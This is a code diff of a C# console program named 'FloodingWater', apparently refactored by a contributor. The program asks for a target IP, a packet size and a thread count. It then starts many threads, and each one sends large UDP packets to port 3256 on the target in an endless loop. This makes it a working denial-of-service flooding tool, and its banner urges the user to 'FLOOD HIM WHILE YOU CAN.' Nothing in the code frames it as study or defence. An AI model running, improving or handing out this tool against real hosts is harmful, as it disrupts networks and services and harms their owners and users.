@@ -1,4 +1,7 @@
-﻿using System;
+﻿///edited by mrkoolaid
+///
+
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Net.Sockets;
@@ -12,85 +15,107 @@ namespace FloodingWater
     {    
         static void Main(string[] args)
         {
-            string ip = "127.0.0.1";
-            int pbytes = 1000;
-            int threads = 50;
+            string ip = string.Empty;
+            int pbytes = 0, threads = 0;
+
+            showInfo();
 
             while (true)
             {
-                Console.ForegroundColor = ConsoleColor.Cyan;
-                Console.WriteLine("FLOODING WATER. FLOOD HIM WHILE YOU CAN.");
-                Console.WriteLine("Loading....");
-                Console.ForegroundColor = ConsoleColor.White;
-                
-                Console.Write("IP: ");
-                ip = Console.ReadLine();
-
-                Console.Write("Packet Size(in kilobytes): ");
-                pbytes = int.Parse(Console.ReadLine());
-
-                Console.Write("AMOUNT OF THREADS: ");
-                threads = int.Parse(Console.ReadLine());
-
-                //make sure we have an IP to work with
-                if (ip.Length > 0 && ip != null)
+                try
                 {
-                    //
-                }
+                    Console.Write("IP (ex; 127.0.0.1): ");
+                    ip = Console.ReadLine();
 
-                for (int i = 0;i<threads;i++)
+                    Console.Write("Packet Size (kb): ");
+                    pbytes = Convert.ToInt32(Console.ReadLine());
+
+                    Console.Write("Threads: ");
+                    threads = Convert.ToInt32(Console.ReadLine());
+
+                    //make sure we have an IP to work with
+                    if (ip.Length <= 0 && ip == null)
+                    {
+                        showInfo();
+                        Environment.Exit(0);
+                    }
+
+                    //loop through and create the threads and run them
+                    for (int i = 0; i < threads; i++)
+                    {
+                        FloodingWater flooder = new FloodingWater(ip, pbytes);
+                    }
+
+                    //i moved from your if statement to a switch which will make it easier to implement other commands
+                    switch (Console.ReadLine())
+                    {
+                        case "Q":
+                            //cleanup and quit
+                            Environment.Exit(0);
+                            break;
+                    }
+                }
+                catch (Exception ex)
                 {
                     Console.Clear();
-                    var t = new Thread(() => Flood(ip,pbytes));
-                    t.Start();
-                }
-
-                Console.WriteLine("Write 'Q' to quit.");
-
-                switch(Console.ReadLine())
-                {
-                    case "Q":
-                        //cleanup and quit
-                        Environment.Exit(0);
-                        break;
+                    Console.WriteLine(ex.Message);
                 }
             }
-
         }
-        
-        static void Flood(string ip,int size)
+
+        static void showInfo()
         {
-            int count = 0;
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.WriteLine("FLOODING WATER. FLOOD HIM WHILE YOU CAN.\nHow to use:");
+            Console.WriteLine("\tWrite 'Q' to quit.\n");
+        }
+    }
+
+    class FloodingWater
+    {
+        private Thread t;
+
+        public FloodingWater(string ip, int pbytes)
+        {
+            t = new Thread(() => this.Flood(ip, pbytes, false));
+            t.Start();
+        }
+
+        /// <summary>
+        /// Flood method
+        /// </summary>
+        /// <param name="ip">IP address to flood</param>
+        /// <param name="size">Size of the packet</param>
+        public void Flood(string ip, int size, bool upnp)
+        {
+            int count = 0, port = 3256;
+            IPEndPoint ep;
+
             while (true)
             {
                 try
                 {
                     byte[] pbytes = new byte[size * 1024];
-                    IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), 3256);
-                    SocketType st = new SocketType();
-                    ProtocolType pt = new ProtocolType();
-                    st = SocketType.Dgram;
-                    pt = ProtocolType.Udp;
                     
+                    ep = new IPEndPoint(IPAddress.Parse(ip), port);
+
+                    SocketType st = SocketType.Dgram;
+                    ProtocolType pt = ProtocolType.Udp;
+
                     Socket sock = new Socket(AddressFamily.InterNetwork, st, pt);
                     sock.SendTo(pbytes, ep);
                     count++;
-                    Console.WriteLine("Sent {0} packets!",count);
+
+                    Console.Clear();
+                    Console.WriteLine("Sent {0} packets!", count);
                 }
                 catch (Exception ex)
                 {
                     Console.WriteLine(ex.Message);
-                    //Console.WriteLine("Error!, Make sure you put valid info");
                     break;
                 }
             }
         }
-
-        
-    }
-
-    class FloodingWater
-    {
-        //
     }
 }
